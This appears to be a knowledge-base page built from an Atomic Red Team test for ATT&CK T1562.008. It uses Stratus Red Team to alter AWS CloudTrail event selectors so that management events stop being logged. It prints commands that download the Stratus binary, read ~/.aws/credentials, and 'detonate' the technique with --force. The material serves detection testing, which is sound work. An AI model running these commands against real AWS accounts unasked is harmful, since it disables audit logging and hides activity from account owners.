---
atomic_guid: "a27418de-bdce-4ebd-b655-38f11142bf0c"
title: "AWS - Disable CloudTrail Logging Through Event Selectors using Stratus"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.008"
attack_technique_name: "Impair Defenses: Disable Cloud Logs"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.008/T1562.008.yaml"
build_date: "2026-04-26 17:02:13"
executor: "sh"
aliases:
  - "a27418de-bdce-4ebd-b655-38f11142bf0c"
  - "AWS - Disable CloudTrail Logging Through Event Selectors using Stratus"
platforms:
  - "linux"
  - "macos"
  - "iaas:aws"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# AWS - Disable CloudTrail Logging Through Event Selectors using Stratus

Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/

## Metadata

- Atomic GUID: a27418de-bdce-4ebd-b655-38f11142bf0c
- Technique: T1562.008: Impair Defenses: Disable Cloud Logs
- Platforms: linux, macos, iaas:aws
- Executor: sh
- Elevation Required: False
- Dependency Executor: sh
- Source Path: atomics/T1562.008/T1562.008.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.008]]

## Input Arguments

### aws_region

- description: AWS region to detonate
- type: string
- default: us-west-2

### stratus_path

- description: Path of stratus binary
- type: path
- default: $PathToAtomicsFolder/T1562.008/src

## Dependencies

Stratus binary must be present at the (#{stratus_path}/stratus)

### Prerequisite Check

```bash
if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;
```

### Get Prerequisite

```bash
if [ "$(uname)" == "Darwin" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
elif [ "$(expr substr $(uname) 1 5)" == "Linux" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '"' -f 4) 
  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
fi
```

Check if ~/.aws/credentials file has a default stanza is configured

### Prerequisite Check

```bash
cat ~/.aws/credentials | grep "default"
```

### Get Prerequisite

```bash
echo Please install the aws-cli and configure your AWS defult profile using: aws configure
```

## Executor

- elevation_required: False
- name: sh

### Command

```bash
export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo "starting warmup"
./stratus warmup aws.defense-evasion.cloudtrail-event-selectors
echo "starting detonate"
./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force
```

### Cleanup

```bash
export AWS_REGION=#{aws_region}
echo "Cleanup detonation"
cd #{stratus_path}
./stratus cleanup --all
rm -rf stratus*
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.008/T1562.008.yaml)
